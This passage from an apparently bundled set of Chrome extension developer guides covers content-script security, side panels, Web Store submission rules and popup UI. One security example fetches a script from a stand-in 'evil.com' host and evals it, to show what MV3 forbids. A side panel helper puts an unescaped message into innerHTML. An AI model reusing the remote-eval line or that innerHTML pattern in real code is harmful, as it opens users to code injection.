proxy\nconst response = await fetch('https://your-backend.com/api/proxy', {\n  method: 'POST',\n  body: JSON.stringify({ action: 'getData' })\n});\n// Backend adds API key server-side\n```\n\n---\n\n## Content Script Security\n\n### Isolated World\n\n```javascript\n// Content scripts run in isolated world by default\n// Cannot access page's JavaScript variables\n\n// If you need page context:\n{\n  \"content_scripts\": [{\n    \"world\": \"MAIN\",  // Runs in page context - DANGEROUS\n    \"matches\": [\"*://*.trusted-domain.com/*\"],\n    \"js\": [\"page-script.js\"]\n  }]\n}\n\n// Better: Inject script element\nconst script = document.createElement('script');\nscript.src = chrome.runtime.getURL('inject.js');\ndocument.documentElement.appendChild(script);\nscript.onload = () => script.remove();\n```\n\n### Safe DOM Interaction\n\n```javascript\n// DANGEROUS - Page might override\ndocument.querySelector('#submit').click();\n\n// SAFER - Use methods directly\nconst button = document.querySelector('#submit');\nHTMLElement.prototype.click.call(button);\n\n// Or dispatch events\nbutton.dispatchEvent(new MouseEvent('click', { bubbles: true }));\n```\n\n---\n\n## Code Injection Prevention\n\n### No Remote Code\n\n```javascript\n// FORBIDDEN in MV3\n// Cannot fetch and execute remote scripts\nconst code = await fetch('https://evil.com/script.js');\neval(code);  // Blocked by CSP\n\n// Cannot include remote scripts in HTML\n// <script src=\"https://remote.com/script.js\"></script>  // Blocked\n\n// ALLOWED\n// Bundle all code in extension\n// Use static imports\nimport { helper } from './helper.js';\n```\n\n### Dynamic Script Injection\n\n```javascript\n// If you must inject code dynamically\n// Use chrome.scripting with bundled files\n\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  files: ['bundled-script.js']  // Must be in extension\n});\n\n// For dynamic behavior, pass data\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  func: (config) => {\n    // config is data, not code\n    console.log(config.message);\n  },\n  args: [{ message: 'Hello' }]\n});\n```\n\n---\n\n## Security Checklist\n\n### Permissions\n- [ ] Using minimum required permissions\n- [ ] activeTab instead of tabs where possible\n- [ ] Scoped host_permissions\n- [ ] Optional permissions for non-essential features\n\n### CSP\n- [ ] No unsafe-eval (except sandbox)\n- [ ] No inline scripts\n- [ ] No remote code loading\n- [ ] Sandbox for dynamic code needs\n\n### XSS Prevention\n- [ ] Using textContent for user input\n- [ ] Sanitizing any HTML input\n- [ ] Validating URLs before use\n- [ ] No innerHTML with untrusted data\n\n### Messaging\n- [ ] Validating sender.id\n- [ ] Validating message content\n- [ ] Proper externally_connectable config\n- [ ] No sensitive data in messages\n\n### Storage\n- [ ] Encrypting sensitive data\n- [ ] Not storing API keys client-side\n- [ ] Using session storage for temporary data\n- [ ] Proper storage quota management\n\n### Network\n- [ ] HTTPS only\n- [ ] API keys server-side\n- [ ] Input validation before API calls\n- [ ] Error handling without data leakage\n\n### Content Scripts\n- [ ] Isolated world by default\n- [ ] Safe DOM manipulation\n- [ ] No eval or Function constructor\n- [ ] Proper event delegation\n\n---\n\n## Common Vulnerabilities\n\n| Vulnerability | Risk | Prevention |\n|--------------|------|------------|\n| XSS | Code execution | Use textContent, sanitize HTML |\n| CSRF | Unauthorized actions | Validate message sources |\n| Data leakage | Privacy breach | Encrypt storage, HTTPS only |\n| Over-privileged | Attack surface | Minimum permissions |\n| Code injection | Full compromise | No eval, no remote code |\n| Clickjacking | UI manipulation | Frame-busting, CSP |"
              },
              {
                "name": "side-panel-development",
                "description": "Side Panel development patterns for Chrome Extensions covering manifest configuration, chrome.sidePanel API, programmatic control, per-tab vs global panels, lifecycle management, and communication patterns. Use when building side panel features.",
                "path": "chrome-extension-expert/skills/side-panel-development/SKILL.md",
                "frontmatter": {
                  "name": "side-panel-development",
                  "description": "Side Panel development patterns for Chrome Extensions covering manifest configuration, chrome.sidePanel API, programmatic control, per-tab vs global panels, lifecycle management, and communication patterns. Use when building side panel features."
                },
                "content": "# Chrome Extension Side Panel Development\n\n## Overview\n\nSide panels provide a persistent UI alongside web pages, offering richer interaction than popups.\n\n**Key Characteristics:**\n- Persistent while browsing (unlike popups)\n- Can be per-tab or global\n- Requires `sidePanel` permission\n- Available in Chrome 114+\n\n---\n\n## Manifest Configuration\n\n### Basic Setup\n\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"Side Panel Extension\",\n  \"version\": \"1.0.0\",\n  \"permissions\": [\"sidePanel\"],\n  \"side_panel\": {\n    \"default_path\": \"sidepanel.html\"\n  },\n  \"action\": {\n    \"default_title\": \"Open Side Panel\"\n  },\n  \"background\": {\n    \"service_worker\": \"background.js\"\n  }\n}\n```\n\n### Side Panel HTML\n\n```html\n<!-- sidepanel.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <link rel=\"stylesheet\" href=\"sidepanel.css\">\n</head>\n<body>\n  <div id=\"app\">\n    <header>\n      <h1>Side Panel</h1>\n    </header>\n    <main id=\"content\">\n      <!-- Content here -->\n    </main>\n  </div>\n  <script src=\"sidepanel.js\"></script>\n</body>\n</html>\n```\n\n---\n\n## chrome.sidePanel API\n\n### Opening Side Panel\n\n```javascript\n// background.js\n\n// Open on action click\nchrome.sidePanel.setPanelBehavior({\n  openPanelOnActionClick: true\n});\n\n// Or manually open on click\nchrome.action.onClicked.addListener(async (tab) => {\n  await chrome.sidePanel.open({ tabId: tab.id });\n});\n\n// Open for entire window\nchrome.action.onClicked.addListener(async (tab) => {\n  await chrome.sidePanel.open({ windowId: tab.windowId });\n});\n```\n\n### Setting Panel Options\n\n```javascript\n// Set panel for specific tab\nawait chrome.sidePanel.setOptions({\n  tabId: tab.id,\n  path: 'sidepanel.html',\n  enabled: true\n});\n\n// Disable panel for specific tab\nawait chrome.sidePanel.setOptions({\n  tabId: tab.id,\n  enabled: false\n});\n\n// Set default panel (all tabs)\nawait chrome.sidePanel.setOptions({\n  path: 'sidepanel.html',\n  enabled: true\n});\n```\n\n### Getting Panel Options\n\n```javascript\n// Get options for specific tab\nconst options = await chrome.sidePanel.getOptions({ tabId: tab.id });\nconsole.log('Panel path:', options.path);\nconsole.log('Enabled:', options.enabled);\n\n// Get default options\nconst defaultOptions = await chrome.sidePanel.getOptions({});\n```\n\n### Panel Behavior\n\n```javascript\n// Auto-open on extension icon click\nawait chrome.sidePanel.setPanelBehavior({\n  openPanelOnActionClick: true\n});\n\n// Get current behavior\nconst behavior = await chrome.sidePanel.getPanelBehavior();\nconsole.log('Opens on click:', behavior.openPanelOnActionClick);\n```\n\n---\n\n## Per-Tab vs Global Side Panels\n\n### Global Panel (Same for All Tabs)\n\n```javascript\n// background.js - Set once\nchrome.runtime.onInstalled.addListener(() => {\n  chrome.sidePanel.setOptions({\n    path: 'sidepanel.html',\n    enabled: true\n  });\n});\n```\n\n### Per-Tab Panel (Different Content per Tab)\n\n```javascript\n// background.js\nchrome.tabs.onActivated.addListener(async ({ tabId }) => {\n  const tab = await chrome.tabs.get(tabId);\n\n  // Different panel based on URL\n  if (tab.url?.includes('github.com')) {\n    await chrome.sidePanel.setOptions({\n      tabId,\n      path: 'sidepanel-github.html'\n    });\n  } else if (tab.url?.includes('docs.google.com')) {\n    await chrome.sidePanel.setOptions({\n      tabId,\n      path: 'sidepanel-docs.html'\n    });\n  } else {\n    await chrome.sidePanel.setOptions({\n      tabId,\n      path: 'sidepanel-default.html'\n    });\n  }\n});\n\n// Also handle URL changes within tab\nchrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {\n  if (changeInfo.url) {\n    // Update panel based on new URL\n    await updatePanelForTab(tabId, changeInfo.url);\n  }\n});\n```\n\n---\n\n## Side Panel Lifecycle\n\n### Panel Load/Unload\n\n```javascript\n// sidepanel.js\ndocument.addEventListener('DOMContentLoaded', async () => {\n  console.log('Side panel loaded');\n\n  // Get current tab\n  const [tab] = await chrome.tabs.query({\n    active: true,\n    currentWindow: true\n  });\n\n  // Initialize with tab data\n  await initializePanel(tab);\n});\n\n// Clean up before unload\nwindow.addEventListener('beforeunload', () => {\n  // Save state\n  saveCurrentState();\n});\n\n// Visibility change (panel minimized/restored)\ndocument.addEventListener('visibilitychange', () => {\n  if (document.hidden) {\n    console.log('Panel hidden');\n  } else {\n    console.log('Panel visible');\n  }\n});\n```\n\n### State Persistence\n\n```javascript\n// sidepanel.js\n\n// Save state when it changes\nasync function saveState(state) {\n  await chrome.storage.session.set({ sidePanelState: state });\n}\n\n// Restore state on load\nasync function restoreState() {\n  const { sidePanelState } = await chrome.storage.session.get('sidePanelState');\n  if (sidePanelState) {\n    applyState(sidePanelState);\n  }\n}\n\n// Tab-specific state\nasync function saveTabState(tabId, state) {\n  const key = `sidePanelState_${tabId}`;\n  await chrome.storage.session.set({ [key]: state });\n}\n\nasync function getTabState(tabId) {\n  const key = `sidePanelState_${tabId}`;\n  const result = await chrome.storage.session.get(key);\n  return result[key];\n}\n```\n\n---\n\n## Communication Patterns\n\n### Side Panel → Background\n\n```javascript\n// sidepanel.js\nasync function fetchData() {\n  const response = await chrome.runtime.sendMessage({\n    type: 'FETCH_DATA',\n    query: 'search term'\n  });\n\n  if (response.success) {\n    displayData(response.data);\n  }\n}\n```\n\n### Background → Side Panel\n\n```javascript\n// background.js\nfunction notifySidePanel(data) {\n  chrome.runtime.sendMessage({\n    type: 'DATA_UPDATE',\n    data\n  }).catch(() => {\n    // Side panel might not be open\n  });\n}\n```\n\n### Side Panel ↔ Content Script (via Background)\n\n```javascript\n// sidepanel.js\nasync function getPageData() {\n  const [tab] = await chrome.tabs.query({\n    active: true,\n    currentWindow: true\n  });\n\n  // Request goes through background\n  const response = await chrome.runtime.sendMessage({\n    type: 'GET_PAGE_DATA',\n    tabId: tab.id\n  });\n\n  return response;\n}\n\n// background.js\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  if (message.type === 'GET_PAGE_DATA') {\n    chrome.tabs.sendMessage(message.tabId, { type: 'EXTRACT_DATA' })\n      .then(sendResponse)\n      .catch(error => sendResponse({ error: error.message }));\n    return true;\n  }\n});\n```\n\n### Long-Lived Connection\n\n```javascript\n// sidepanel.js\nlet port;\n\nfunction connectToBackground() {\n  port = chrome.runtime.connect({ name: 'sidepanel' });\n\n  port.onMessage.addListener((message) => {\n    handleBackgroundMessage(message);\n  });\n\n  port.onDisconnect.addListener(() => {\n    console.log('Disconnected, reconnecting...');\n    setTimeout(connectToBackground, 1000);\n  });\n}\n\ndocument.addEventListener('DOMContentLoaded', connectToBackground);\n\nfunction sendToBackground(message) {\n  if (port) {\n    port.postMessage(message);\n  }\n}\n```\n\n---\n\n## Side Panel vs Popup Decision Guide\n\n| Feature | Side Panel | Popup |\n|---------|------------|-------|\n| **Persistence** | Stays open while browsing | Closes on outside click |\n| **Size** | Full height, ~400px width | Max 800x600 |\n| **Use Case** | Ongoing tasks, reference | Quick actions |\n| **Tab Context** | Can track active tab | Single tab context |\n| **Performance** | Always loaded when open | Loaded on demand |\n| **Minimum Chrome** | 114+ | All versions |\n\n**Choose Side Panel when:**\n- User needs persistent workspace\n- Content relates to multiple tabs\n- Complex interactions required\n- Reference material while browsing\n\n**Choose Popup when:**\n- Quick, single action\n- Simple settings toggle\n- Compatibility with older Chrome\n- Minimal resource usage\n\n---\n\n## UI Patterns for Side Panels\n\n### Responsive Width\n\n```css\n/* sidepanel.css */\n:root {\n  --panel-padding: 16px;\n}\n\nbody {\n  margin: 0;\n  padding: var(--panel-padding);\n  font-family: system-ui, sans-serif;\n  font-size: 14px;\n  /* Panel width is typically 320-400px */\n  min-width: 280px;\n  max-width: 100%;\n}\n\n/* Stack layout for narrow panels */\n.container {\n  display: flex;\n  flex-direction: column;\n  gap: 12px;\n}\n```\n\n### Header with Tab Info\n\n```javascript\n// sidepanel.js\nasync function updateHeader() {\n  const [tab] = await chrome.tabs.query({\n    active: true,\n    currentWindow: true\n  });\n\n  document.getElementById('site-name').textContent =\n    new URL(tab.url).hostname;\n  document.getElementById('favicon').src = tab.favIconUrl || '';\n}\n\n// Update when tab changes\nchrome.tabs.onActivated.addListener(updateHeader);\nchrome.tabs.onUpdated.addListener((tabId, changeInfo) => {\n  if (changeInfo.title || changeInfo.favIconUrl) {\n    updateHeader();\n  }\n});\n```\n\n### Loading States\n\n```javascript\n// sidepanel.js\nfunction showLoading() {\n  document.getElementById('content').innerHTML = `\n    <div class=\"loading\">\n      <div class=\"spinner\"></div>\n      <p>Loading...</p>\n    </div>\n  `;\n}\n\nfunction showError(message) {\n  document.getElementById('content').innerHTML = `\n    <div class=\"error\">\n      <p>${message}</p>\n      <button onclick=\"retry()\">Retry</button>\n    </div>\n  `;\n}\n```\n\n### Scrollable Content\n\n```css\n/* sidepanel.css */\n#app {\n  display: flex;\n  flex-direction: column;\n  height: 100vh;\n}\n\nheader {\n  flex-shrink: 0;\n  padding: 12px;\n  border-bottom: 1px solid #e0e0e0;\n}\n\nmain {\n  flex: 1;\n  overflow-y: auto;\n  padding: 12px;\n}\n\nfooter {\n  flex-shrink: 0;\n  padding: 12px;\n  border-top: 1px solid #e0e0e0;\n}\n```\n\n---\n\n## Advanced Patterns\n\n### Tab-Specific Side Panels\n\n```javascript\n// background.js\nconst tabPanelStates = new Map();\n\nchrome.tabs.onActivated.addListener(async ({ tabId, windowId }) => {\n  // Get or create state for this tab\n  let state = tabPanelStates.get(tabId);\n  if (!state) {\n    state = { initialized: false, data: null };\n    tabPanelStates.set(tabId, state);\n  }\n\n  // Notify side panel of tab change\n  chrome.runtime.sendMessage({\n    type: 'TAB_CHANGED',\n    tabId,\n    state\n  }).catch(() => {});\n});\n\n// Clean up when tab closes\nchrome.tabs.onRemoved.addListener((tabId) => {\n  tabPanelStates.delete(tabId);\n});\n```\n\n### Conditional Side Panel Enabling\n\n```javascript\n// background.js\nchrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {\n  if (changeInfo.status === 'complete' && tab.url) {\n    // Only enable for supported sites\n    const supportedSites = [\n      'github.com',\n      'stackoverflow.com',\n      'developer.mozilla.org'\n    ];\n\n    const isSupported = supportedSites.some(site =>\n      tab.url.includes(site)\n    );\n\n    await chrome.sidePanel.setOptions({\n      tabId,\n      enabled: isSupported\n    });\n  }\n});\n```\n\n### Side Panel with Content Script Sync\n\n```javascript\n// content.js\nfunction setupMutationObserver() {\n  const observer = new MutationObserver((mutations) => {\n    // Detect relevant page changes\n    const relevantChanges = filterRelevantMutations(mutations);\n\n    if (relevantChanges.length > 0) {\n      chrome.runtime.sendMessage({\n        type: 'PAGE_CONTENT_CHANGED',\n        changes: relevantChanges\n      });\n    }\n  });\n\n  observer.observe(document.body, {\n    childList: true,\n    subtree: true\n  });\n}\n\n// sidepanel.js - Listen for updates\nchrome.runtime.onMessage.addListener((message) => {\n  if (message.type === 'PAGE_CONTENT_CHANGED') {\n    refreshData(message.changes);\n  }\n});\n```\n\n---\n\n## Best Practices\n\n1. **Save state frequently** - Users expect panel state to persist\n2. **Handle tab switches gracefully** - Update content for new tab\n3. **Use efficient layouts** - Narrow width requires careful design\n4. **Communicate via background** - Never assume direct content script access\n5. **Show loading states** - Panel operations can be async\n6. **Handle disconnections** - Reconnect ports automatically\n7. **Test across window sizes** - Users may resize browser\n8. **Consider dark mode** - Match system preferences\n9. **Minimize background wake-ups** - Battery/performance impact\n10. **Provide clear close/minimize options** - User control"
              },
              {
                "name": "store-requirements",
                "description": "Chrome Web Store guidelines and requirements covering Developer Program Policies, single purpose requirement, permission justifications, privacy policy, branding, screenshots, common rejection reasons, and appeal process. Essential for successful store submission.",
                "path": "chrome-extension-expert/skills/store-requirements/SKILL.md",
                "frontmatter": {
                  "name": "store-requirements",
                  "description": "Chrome Web Store guidelines and requirements covering Developer Program Policies, single purpose requirement, permission justifications, privacy policy, branding, screenshots, common rejection reasons, and appeal process. Essential for successful store submission."
                },
                "content": "# Chrome Web Store Requirements\n\n## Developer Program Policies\n\n### Core Principles\n\n1. **Single Purpose** - Extension must have one clear purpose\n2. **Transparency** - Clearly describe functionality\n3. **Privacy** - Respect user data\n4. **Security** - No malicious behavior\n5. **Quality** - Work as advertised\n\n### Policy Categories\n\n| Category | Key Requirements |\n|----------|-----------------|\n| Content | No malware, spam, hate, or illegal content |\n| Data | Minimal collection, clear disclosure |\n| Functionality | Works as described, no deception |\n| Monetization | Clear about paid features |\n| User Experience | No unwanted behavior |\n\n---\n\n## Single Purpose Requirement\n\n### What It Means\n\nYour extension should do **ONE thing well**, not bundle unrelated features.\n\n**ACCEPTABLE:**\n- Tab manager with grouping, search, and organization\n- Note-taking with formatting, tags, and sync\n- Ad blocker with filter customization\n\n**NOT ACCEPTABLE:**\n- Tab manager + weather widget + game\n- Coupon finder + screenshot tool\n- Anything with \"multi-tool\" bundled features\n\n### How to Define Purpose\n\n```markdown\n## Single Purpose Statement\n[Extension Name] helps users [primary action] by [method].\n\nExample:\n\"TabMaster helps users organize their browser tabs by providing\ngrouping, search, and session management features.\"\n```\n\n### Feature Justification\n\nAll features should relate to the core purpose:\n\n| Feature | Core: Tab Management | Justified? |\n|---------|---------------------|------------|\n| Tab grouping | Direct | ✅ |\n| Tab search | Direct | ✅ |\n| Session save | Related | ✅ |\n| Tab statistics | Enhancement | ✅ |\n| Weather widget | Unrelated | ❌ |\n| Ad blocking | Unrelated | ❌ |\n\n---\n\n## Permission Justifications\n\n### When Required\n\nJustifications required for:\n- `tabs`\n- `webNavigation`\n- `history`\n- `bookmarks`\n- `topSites`\n- `browsingData`\n- `<all_urls>` or broad host permissions\n\n### Writing Good Justifications\n\n**Structure:**\n```\nPermission: [permission name]\n\n1. What we use it for:\n   [Specific feature that needs this permission]\n\n2. Why it's necessary:\n   [Why the feature can't work without it]\n\n3. What we don't do:\n   [Reassurance about data not collected/shared]\n```\n\n**Example - tabs permission:**\n```\nPermission: tabs\n\n1. What we use it for:\n   - Display tab titles in our tab search feature\n   - Show favicon in the tab list\n   - Enable \"Switch to Tab\" functionality\n\n2. Why it's necessary:\n   Our core tab management features require reading tab metadata\n   to provide search and organization capabilities.\n\n3. What we don't do:\n   - We do not track browsing history\n   - We do not transmit URLs to external servers\n   - Tab data is only stored locally on the user's device\n```\n\n### Common Permission Justifications\n\n**activeTab:**\n```\nRequired to read the current page content when the user clicks\nthe extension icon. Only activated on user gesture, no passive\naccess to browsing data.\n```\n\n**storage:**\n```\nUsed to save user preferences and extension state locally.\nNo data is transmitted to external servers.\n```\n\n**alarms:**\n```\nRequired for scheduling periodic background tasks like\nsyncing saved data and checking for updates.\n```\n\n---\n\n## Privacy Policy Requirements\n\n### When Required\n\nPrivacy policy is **required** if your extension:\n- Collects any user data\n- Uses analytics\n- Has any network requests\n- Uses certain permissions (tabs, history, etc.)\n\n### Required Sections\n\n```markdown\n# Privacy Policy for [Extension Name]\n\nLast updated: [Date]\n\n## What Data We Collect\n- [List all data collected]\n- [Include data from permissions]\n- [Include any analytics]\n\n## How We Use Data\n- [Purpose for each data type]\n- [Who processes the data]\n\n## Data Storage\n- Where data is stored (local/cloud)\n- How long data is retained\n- Encryption methods used\n\n## Data Sharing\n- Third parties who receive data\n- Purpose of sharing\n- Or: \"We do not share data with third parties\"\n\n## User Rights\n- How to access your data\n- How to delete your data\n- How to opt out\n\n## Changes to Policy\n- How users will be notified\n\n## Contact\n- Email for privacy concerns\n```\n\n### Hosting Requirements\n\n- Must be hosted on accessible URL\n- HTTPS required\n- Should be stable (don't use temporary hosts)\n- Good options: GitHub Pages, your website\n\n---\n\n## Store Listing Requirements\n\n### Extension Name\n\n- **Max:** 45 characters\n- **Must:** Be unique and descriptive\n- **Avoid:** Keyword stuffing, misleading names\n- **No:** Trademark infringement\n\n### Description\n\n**Short description (shown in search):**\n- First ~132 characters are crucial\n- Clear value proposition\n- No keyword stuffing\n\n**Full description:**\n```markdown\n[One-line value proposition]\n\nKey Features:\n• [Feature 1]\n• [Feature 2]\n• [Feature 3]\n\nHow to Use:\n1. [Step 1]\n2. [Step 2]\n3. [Step 3]\n\n[Additional details about the extension]\n\nSupport: [contact info or support URL]\n```\n\n### Screenshots\n\n**Requirements:**\n- Size: 1280x800 or 640x400 pixels\n- Format: PNG or JPEG\n- Minimum: 1\n- Maximum: 5\n\n**Best Practices:**\n- Show actual functionality\n- Include UI elements\n- Add brief annotations if needed\n- Avoid excessive text/branding\n- High quality, no compression artifacts\n\n### Promotional Images\n\n| Image | Size | Required |\n|-------|------|----------|\n| Small tile | 440x280 | Yes (for featuring) |\n| Marquee | 1400x560 | No (for featuring) |\n\n### Icons\n\n| Size | Usage | Required |\n|------|-------|----------|\n| 16x16 | Toolbar | Yes |\n| 32x32 | Windows | Recommended |\n| 48x48 | Extensions page | Yes |\n| 128x128 | Store listing | Yes |\n\n---\n\n## Common Rejection Reasons\n\n### 1. Single Purpose Violation\n\n**Error:** \"Does not comply with the single purpose policy\"\n\n**Fix:**\n- Remove unrelated features\n- Split into multiple extensions\n- Update description to clarify purpose\n\n### 2. Missing/Inadequate Privacy Policy\n\n**Error:** \"Missing or inadequate privacy policy\"\n\n**Fix:**\n- Create comprehensive privacy policy\n- Host on accessible HTTPS URL\n- Cover all data practices\n\n### 3. Permission Overreach\n\n**Error:** \"Requesting permissions that exceed functionality\"\n\n**Fix:**\n- Remove unnecessary permissions\n- Use activeTab instead of tabs\n- Add optional_permissions\n- Provide clear justifications\n\n### 4. Misleading Functionality\n\n**Error:** \"Does not work as described\"\n\n**Fix:**\n- Match description to actual features\n- Test all advertised functionality\n- Remove claims about unimplemented features\n\n### 5. Missing Justifications\n\n**Error:** \"Missing permission justification\"\n\n**Fix:**\n- Add justifications in Developer Dashboard\n- Be specific about each permission use\n- Explain user benefit\n\n### 6. Quality Issues\n\n**Error:** \"Extension does not meet quality standards\"\n\n**Fix:**\n- Fix all bugs\n- Test on multiple sites\n- Handle errors gracefully\n- Improve performance\n\n### 7. Deceptive Behavior\n\n**Error:** \"Extension engages in deceptive practices\"\n\n**Fix:**\n- Remove hidden functionality\n- Be transparent about monetization\n- Don't change browser settings unexpectedly\n\n---\n\n## Submission Process\n\n### Developer Account Setup\n\n1. Go to [Chrome Developer Dashboard](https://chrome.google.com/webstore/devconsole)\n2. Pay one-time $5 registration fee\n3. Verify email address\n4. Complete account profile\n\n### Package Preparation\n\n```bash\n# Create ZIP file (not .crx)\nzip -r extension.zip \\\n  manifest.json \\\n  background.js \\\n  content.js \\\n  popup/ \\\n  icons/ \\\n  # ... all files except:\n  #   - .git/\n  #   - node_modules/\n  #   - source files (if bundled)\n```\n\n### Submission Steps\n\n1. **Upload** - Upload ZIP file\n2. **Store Listing** - Fill in all fields\n3. **Privacy** - Complete privacy questionnaire\n4. **Screenshots** - Upload required images\n5. **Distribution** - Choose visibility\n6. **Submit** - Send for review\n\n### Review Timeline\n\n| Submission Type | Typical Time |\n|----------------|--------------|\n| New extension | 1-3 business days |\n| Update | 1-2 business days |\n| After rejection | Varies |\n\n---\n\n## Update Strategy\n\n### Version Management\n\n```json\n{\n  \"version\": \"1.2.3\"\n  // Major.Minor.Patch\n  // Major: Breaking changes, significant features\n  // Minor: New features, improvements\n  // Patch: Bug fixes\n}\n```\n\n### Update Best Practices\n\n1. **Test thoroughly** before submission\n2. **Stage rollout** if available\n3. **Document changes** in store listing\n4. **Maintain backwards compatibility**\n5. **Respond to user feedback**\n\n### Update Notes Template\n\n```markdown\nVersion X.Y.Z - [Date]\n\nNew Features:\n• [Feature description]\n\nImprovements:\n• [Improvement description]\n\nBug Fixes:\n• [Bug fix description]\n\nThank you for your feedback!\n```\n\n---\n\n## Appeal Process\n\n### When to Appeal\n\n- Believe rejection was incorrect\n- Have additional information\n- Made changes to address concerns\n\n### How to Appeal\n\n1. Reply to rejection email\n2. Be professional and factual\n3. Provide specific information:\n\n```\nSubject: Appeal for [Extension Name] - [Submission ID]\n\nDear Chrome Web Store Team,\n\nI am writing to appeal the rejection of [Extension Name].\n\nRejection Reason: [Quote their reason]\n\nMy Response:\n[Explain why you believe this is incorrect, OR]\n[Explain changes you've made to address the issue]\n\nEvidence:\n[Screenshots, code snippets, or documentation]\n\nI believe this addresses the concern because:\n[Clear reasoning]\n\nPlease let me know if you need additional information.\n\nBest regards,\n[Your name]\n```\n\n### Appeal Timeline\n\n- Initial response: 3-5 business days\n- Complex cases: 1-2 weeks\n- May require multiple exchanges\n\n---\n\n## Compliance Checklist\n\n### Before Submission\n- [ ] Extension has single, clear purpose\n- [ ] All features relate to core purpose\n- [ ] Permissions are minimal and justified\n- [ ] Privacy policy covers all data practices\n- [ ] Description accurately reflects functionality\n- [ ] All screenshots show real functionality\n- [ ] Icons are clear and professional\n- [ ] Extension tested and working\n- [ ] No console errors\n- [ ] No policy violations\n\n### Store Listing\n- [ ] Name is unique and descriptive (≤45 chars)\n- [ ] Description explains value clearly\n- [ ] Category is appropriate\n- [ ] Screenshots are high quality (1280x800)\n- [ ] Small tile provided (440x280)\n- [ ] Privacy policy URL accessible\n\n### Technical\n- [ ] Manifest V3 compliant\n- [ ] No remote code\n- [ ] Proper error handling\n- [ ] CSP compliant\n- [ ] No hardcoded secrets"
              },
              {
                "name": "ui-patterns",
                "description": "UI patterns for Chrome Extension interfaces covering popup design, options pages, side panel layouts, responsive design, dark mode, accessibility, form handling, and navigation patterns. Use when designing extension user interfaces.",
                "path": "chrome-extension-expert/skills/ui-patterns/SKILL.md",
                "frontmatter": {
                  "name": "ui-patterns",
                  "description": "UI patterns for Chrome Extension interfaces covering popup design, options pages, side panel layouts, responsive design, dark mode, accessibility, form handling, and navigation patterns. Use when designing extension user interfaces."
                },
                "content": "# Chrome Extension UI Patterns\n\n## Popup UI\n\n### Popup Constraints\n\n- **Max size:** 800px wide × 600px tall\n- **Min size:** 25px × 25px\n- **Behavior:** Closes on outside click\n- **Lifecycle:** Recreated each time opened\n\n### Basic Popup Structure\n\n```html\n<!-- popup.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <link rel=\"stylesheet\" href=\"popup.css\">\n</head>\n<body>\n  <div class=\"popup-container\">\n    <header class=\"popup-header\">\n      <img src=\"icons/icon32.png\" alt=\"Logo\" class=\"logo\">\n      <h1>Extension Name</h1>\n    </header>\n\n    <main class=\"popup-content\">\n      <!-- Main content -->\n    </main>\n\n    <footer class=\"popup-footer\">\n      <button id=\"options\">Settings</button>\n    </footer>\n  </div>\n  <script src=\"popup.js\"></script>\n</body>\n</html>\n```\n\n### Popup Styles\n\n```css\n/* popup.css */\n* {\n  box-sizing: border-box;\n  margin: 0;\n  padding: 0;\n}\n\nbody {\n  width: 350px;\n  min-height: 200px;\n  font-family: system-ui, -apple-system, sans-serif;\n  font-size: 14px;\n  color: #333;\n}\n\n.popup-container {\n  display: flex;\n  flex-direction: column;\n  min-height: 200px;\n}\n\n.popup-header {\n  display: flex;\n  align-items: center;\n  gap: 8px;\n  padding: 12px 16px;\n  border-bottom: 1px solid #e0e0e0;\n}\n\n.popup-header h1 {\n  font-size: 16px;\n  font-weight: 600;\n}\n\n.popup-content {\n  flex: 1;\n  padding: 16px;\n  overflow-y: auto;\n}\n\n.popup-footer {\n  padding: 12px 16px;\n  border-top: 1px solid #e0e0e0;\n  display: flex;\n  justify-content: flex-end;\n  gap: 8px;\n}\n```\n\n### Popup Patterns\n\n**Quick Actions List:**\n```html\n<ul class=\"action-list\">\n  <li class=\"action-item\" data-action=\"save\">\n    <span class=\"action-icon\">💾</span>\n    <span class=\"action-text\">Save Page</span>\n    <span class=\"action-shortcut\">⌘S</span>\n  </li>\n  <li class=\"action-item\" data-action=\"share\">\n    <span class=\"action-icon\">📤</span>\n    <span class=\"action-text\">Share</span>\n  </li>\n</ul>\n```\n\n```css\n.action-list {\n  list-style: none;\n}\n\n.action-item {\n  display: flex;\n  align-items: center;\n  gap: 12px;\n  padding: 10px 12px;\n  cursor: pointer;\n  border-radius: 6px;\n  transition: background 0.15s;\n}\n\n.action-item:hover {\n  background: #f5f5f5;\n}\n\n.action-shortcut {\n  margin-left: auto;\n  font-size: 12px;\n  color: #888;\n}\n```\n\n---\n\n## Side Panel UI\n\n### Side Panel Constraints\n\n- **Width:** Typically 320-400px (user can resize)\n- **Height:** Full browser height\n- **Behavior:** Persistent while browsing\n\n### Side Panel Layout\n\n```html\n<!-- sidepanel.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <link rel=\"stylesheet\" href=\"sidepanel.css\">\n</head>\n<body>\n  <div class=\"panel\">\n    <header class=\"panel-header\">\n      <div class=\"tab-info\">\n        <img id=\"favicon\" class=\"favicon\" alt=\"\">\n        <span id=\"site-name\" class=\"site-name\"></span>\n      </div>\n      <button class=\"header-action\" aria-label=\"Refresh\">🔄</button>\n    </header>\n\n    <nav class=\"panel-tabs\">\n      <button class=\"tab active\" data-tab=\"main\">Main</button>\n      <button class=\"tab\" data-tab=\"history\">History</button>\n      <button class=\"tab\" data-tab=\"settings\">Settings</button>\n    </nav>\n\n    <main class=\"panel-content\">\n      <section id=\"main\" class=\"tab-content active\">\n        <!-- Main content -->\n      </section>\n      <section id=\"history\" class=\"tab-content\">\n        <!-- History content -->\n      </section>\n      <section id=\"settings\" class=\"tab-content\">\n        <!-- Settings content -->\n      </section>\n    </main>\n\n    <footer class=\"panel-footer\">\n      <span class=\"status\" id=\"status\">Ready</span>\n    </footer>\n  </div>\n  <script src=\"sidepanel.js\"></script>\n</body>\n</html>\n```\n\n### Side Panel Styles\n\n```css\n/* sidepanel.css */\n* {\n  box-sizing: border-box;\n  margin: 0;\n  padding: 0;\n}\n\nbody {\n  font-family: system-ui, -apple-system, sans-serif;\n  font-size: 14px;\n  